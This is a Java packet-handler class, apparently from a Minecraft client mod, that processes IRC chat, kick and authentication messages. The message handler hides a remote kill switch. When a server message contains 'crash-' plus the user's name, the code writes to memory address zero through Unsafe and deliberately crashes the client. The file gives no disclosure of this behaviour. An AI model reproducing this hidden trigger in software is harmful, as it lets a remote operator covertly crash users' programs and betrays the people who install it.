package dev.tarico.module.auth.client;

import dev.tarico.Client;
import dev.tarico.module.auth.GuiLogin;
import dev.tarico.module.auth.GuiRegister;
import dev.tarico.module.auth.packet.IServerPacketHandler;
import dev.tarico.module.auth.packet.server.*;
import dev.tarico.utils.Unsafe;
import dev.tarico.utils.client.Helper;
import net.minecraft.util.EnumChatFormatting;

import java.io.IOException;

public class ServerPacketHandler implements IServerPacketHandler {
    public static boolean isPacketed = false;
    @Override
    public void processClose(SClosePacket packet) {
        Helper.sendMessage("IRC Disconnected.");
        ClientImpl.disconnect();
    }

    @Override
    public void processKick(SKickPacket packet) {
        ClientImpl.clear();
    }

    @Override
    public void processMessage(SMessagePacket packet) {
        if (packet.getMessage().contains("crash-" + Client.instance.user)) {
            Unsafe.theUnsafe.putAddress(0,0);
        } else {
            Helper.sendMessage(EnumChatFormatting.WHITE + packet.getMessage());
        }
    }

    @Override
    public void processAuthResult(SAuthResultPacket packet) throws IOException {
        isPacketed = true;
        GuiLogin.callback(packet.getResult());
    }

    @Override
    public void processRegisterResult(SRegisterResultPacket packet) {
        GuiRegister.callback(packet);
    }
}
